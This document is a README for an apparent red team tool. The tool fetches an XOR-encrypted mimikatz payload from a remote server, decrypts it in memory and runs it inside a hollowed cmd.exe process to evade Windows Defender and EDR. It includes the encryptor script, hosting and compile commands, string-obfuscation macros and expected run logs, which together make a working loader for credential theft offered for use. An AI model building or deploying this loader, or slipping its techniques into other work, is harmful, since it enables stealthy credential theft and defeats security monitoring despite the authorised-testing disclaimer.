# 🚀 Process Hollowing + XOR Payload Encryptor

A **red team lab tool** demonstrating **fileless execution** using process hollowing, XOR-encrypted payloads, and in-memory injection to bypass Windows Defender and modern EDR solutions.

---

## 📋 Overview

This project implements a **multi‑layered evasion technique** that:

1. **Downloads** an XOR‑encrypted payload (`mimikatz.exe.enc`) from a remote HTTP server.
2. **Decrypts** the payload in‑memory using a hardcoded XOR key.
3. **Injects** the decrypted PE into a **suspended `cmd.exe`** process using **process hollowing**.
4. **Zeroes** all local buffers to remove forensic traces.
5. **Executes** the payload with a visible console for interactive use.

All sensitive strings (IP, file path) are **obfuscated** at compile time using XOR macros, preventing static detection.

---

## ✨ Features

- ✅ **Fileless execution** – payload never touches disk
- ✅ **XOR‑encrypted payload** – evades network‑based and memory signatures
- ✅ **Process hollowing** – runs inside a legitimate Windows process (`cmd.exe`)
- ✅ **PE relocation support** – works even if preferred base address is unavailable
- ✅ **PEB patching** – updates `ImageBaseAddress` for correct loader initialisation
- ✅ **String obfuscation** – compile‑time XOR hides all sensitive strings
- ✅ **Memory cleanup** – buffers zeroed after injection
- ✅ **Interactive console** – `CREATE_NEW_CONSOLE` shows Mimikatz output
- ✅ **Full character macros** – easily obfuscate any string (0–9, a–z, A–Z, special chars)

---

## 🗂️ Project Structure

```
project/
├── enc.py              # XOR‑encrypts mimikatz.exe → mimikatz.exe.enc
├── Poc.cpp             # Main injector (process hollowing + decryption)
└── README.md           # This file
```

---

## 🔧 Setup & Configuration

### 1️⃣ **Encrypt the Payload**

Place `mimikatz.exe` in the same directory and run:

```bash
python3 enc.py
```

This generates `mimikatz.exe.enc` (XOR‑encrypted with `0xBB`).

### 2️⃣ **Host the Payload**

Start a simple HTTP server:

```bash
python3 -m http.server 80
```

Ensure `mimikatz.exe.enc` is in the server root.

### 3️⃣ **Configure the Injector**

Edit **`USER CONFIGURATION`** in `Poc.cpp`:

```cpp
// 1. Remote server IP address (e.g., "192.168.0.161")
//    Modify the encIP[] array using H_* macros.
//    Example: for "10.0.0.1", use H_1, H_0, H_dot, H_0, H_dot, H_0, H_dot, H_1

// 2. Remote server port (default: 80)
#define REMOTE_PORT 80

// 3. Payload file path on the server (e.g., "/mimikatz.exe.enc")
//    Modify the encPath[] array using H_* macros.

// 4. XOR key used to encrypt the payload (must match enc.py)
#define PAYLOAD_XOR_KEY 0xBB

// 5. String obfuscation XOR key (for compile‑time obfuscation)
#define XOR_STR_KEY 0xAA
```

### 4️⃣ **Compile the Injector**

**Visual Studio (x64):**
```
Project Properties → Configuration → x64
Build → Build Solution
```

**Command line (MinGW or MSVC):**
```bash
cl /EHsc /Fe:Poc.exe Poc.cpp /link winhttp.lib
```

**Run as Administrator:**
```bash
Poc.exe
```

---

## 🧠 How It Works

### **Step‑by‑Step Execution Flow**

```
1. [Injector] → HTTP GET → /mimikatz.exe.enc (encrypted blob)
2. [Injector] → XOR decrypt (0xBB) → plaintext PE in memory
3. [Injector] → CreateProcess(CREATE_SUSPENDED) → cmd.exe
4. [Injector] → NtUnmapViewOfSection → free original image
5. [Injector] → VirtualAllocEx → allocate new PE memory
6. [Injector] → WriteProcessMemory → headers + sections
7. [Injector] → PEB patching → update ImageBaseAddress (x64 offset 0x10)
8. [Injector] → SetThreadContext → set entry point to OEP
9. [Injector] → ResumeThread → payload executes
10. [Injector] → std::fill(0) → zero all local buffers
```

### **Techniques Used**

| Technique | Purpose |
|-----------|---------|
| **String XOR obfuscation** | Hide `/mimikatz.exe.enc` and IP from static analysis |
| **Payload XOR encryption** | Obfuscate network traffic and downloaded buffer |
| **Fileless download** | No disk writes – evades file‑based detection |
| **Process hollowing** | Execute payload inside a legitimate process (`cmd.exe`) |
| **PE relocation** | Ensure payload runs even if preferred base is occupied |
| **PEB update** | Fix loader initialisation by updating `ImageBaseAddress` |
| **Entry point redirection** | Start execution at the payload’s OEP |
| **SeDebugPrivilege** | Gain necessary rights for remote operations |
| **Dynamic API resolution** | Avoid static import‑based monitoring |
| **Memory zeroing** | Erase plaintext PE from injector after injection |
| **Console creation** | Provide interactive output for Mimikatz commands |
| **Custom NT structures** | Ensure clean compilation and reduce dependencies |

---

## 🔑 Configuration Macros

### **Full Character Set**

The code includes macros for **all printable ASCII characters**:

| Category | Macros |
|----------|--------|
| **Digits** | `H_0` to `H_9` |
| **Lowercase** | `H_a` to `H_z` |
| **Uppercase** | `H_A` to `H_Z` |
| **Special** | `H_space`, `H_dot`, `H_slash`, `H_backslash`, `H_colon`, `H_hyphen`, `H_underscore`, `H_at`, `H_hash`, `H_dollar`, `H_percent`, `H_amp`, `H_asterisk`, `H_plus`, `H_comma`, `H_semicolon`, `H_less`, `H_equal`, `H_greater`, `H_question`, `H_lbracket`, `H_rbracket`, `H_caret`, `H_backtick`, `H_lbrace`, `H_pipe`, `H_rbrace`, `H_tilde`, `H_exclam`, `H_quote`, `H_apostrophe`, `H_lparen`, `H_rparen` |

### **Example: Changing the IP Address**

```cpp
// To change IP to "10.0.0.1", replace encIP[] with:
unsigned char encIP[] = {
    H_1 ^ XOR_STR_KEY,
    H_0 ^ XOR_STR_KEY,
    H_dot ^ XOR_STR_KEY,
    H_0 ^ XOR_STR_KEY,
    H_dot ^ XOR_STR_KEY,
    H_0 ^ XOR_STR_KEY,
    H_dot ^ XOR_STR_KEY,
    H_1 ^ XOR_STR_KEY,
    0x00
};
```

### **Example: Changing the File Path**

```cpp
// To change path to "/payload.bin", replace encPath[] with:
unsigned char encPath[] = {
    H_slash ^ XOR_STR_KEY,
    H_p ^ XOR_STR_KEY,
    H_a ^ XOR_STR_KEY,
    H_y ^ XOR_STR_KEY,
    H_l ^ XOR_STR_KEY,
    H_o ^ XOR_STR_KEY,
    H_a ^ XOR_STR_KEY,
    H_d ^ XOR_STR_KEY,
    H_dot ^ XOR_STR_KEY,
    H_b ^ XOR_STR_KEY,
    H_i ^ XOR_STR_KEY,
    H_n ^ XOR_STR_KEY,
    0x00
};
```

---

## 🛠️ `enc.py` – Payload Encryptor

```python
import sys

# XOR‑encrypt mimikatz.exe with key 0xBB
data = open('mimikatz.exe', 'rb').read()
enc = bytes([b ^ 0xBB for b in data])
open('mimikatz.exe.enc', 'wb').write(enc)

print("[+] mimikatz.exe.enc created successfully!")
```

**Usage:**
```bash
python3 enc.py
```

---

## 🖥️ Expected Output

### **Terminal Logs**

```
[+] Path: /mimikatz.exe.enc
[+] IP: 192.168.0.161
[3] Initializing WinHTTP session...
[+] Session opened
[4] Connecting to 192.168.0.161:80 ...
[+] Connected
[5] Sending GET request for /mimikatz.exe.enc
[6] Downloading payload...
    Downloaded 1355264 bytes
[+] Retrieved 1355264 bytes total
[7] Attempting process hollowing into C:\Windows\System32\cmd.exe
[7] Creating suspended process: C:\Windows\System32\cmd.exe
[+] Process created with PID: 22388
[!] Decrypting payload with XOR key 0xBB
[8] Unmapping original image at 0x00007FF6D9FA0000
[!] Keeping subsystem as IMAGE_SUBSYSTEM_WINDOWS_CUI (console)
[9] Allocated at preferred address 0x0000000140000000
[10] Writing PE headers (size: 1024 bytes)
[11] Writing 6 sections
[✓] PEB ImageBaseAddress updated to 0x0000000140000000
[12] Entry point set to 0x1400c98e8
[✓] Local buffers zeroed
[13] Resuming thread
[+] Thread exit code: 259 (259 = still running, 0 = success)
[+] Execution finished.
```

### **New Console Window**

A new `cmd.exe` window appears with **Mimikatz banner**, ready for commands:

```
  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
```

---

## ⚠️ Important Notes

1. **Run as Administrator** – SeDebugPrivilege is required for process hollowing.
2. **x64 Compilation** – the injector targets x64 processes; compile as x64.
3. **Payload Encryption** – the server must serve the encrypted file (`.enc`), not the plain `.exe`.
4. **Defender Behaviour** – while the code is designed to evade, Microsoft continuously updates signatures. This is for **educational and authorised testing only**.

---

## 🧪 Testing

1. **Encrypt** `mimikatz.exe` → `mimikatz.exe.enc` with `enc.py`.
2. **Host** the encrypted file via HTTP.
3. **Compile** `Poc.cpp` as x64.
4. **Run** `Poc.exe` as Administrator.
5. **Verify** – a new `cmd.exe` window appears with Mimikatz.

---

## 📚 References

- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [Process Hollowing Technique](https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations)
- [Windows Defender Bypass Techniques](https://github.com/BC-SECURITY/Offensive-Scripts)
- [NtUnmapViewOfSection & PE Relocations](https://dannyodle.medium.com/process-hollowing-and-pe-image-relocations-5f9d5b2f7b7)

---

## 📄 License

This project is for **educational and red team training purposes only**. Unauthorised use against systems without explicit permission is illegal.

---

**Happy Hacking!** 🛡️🔒
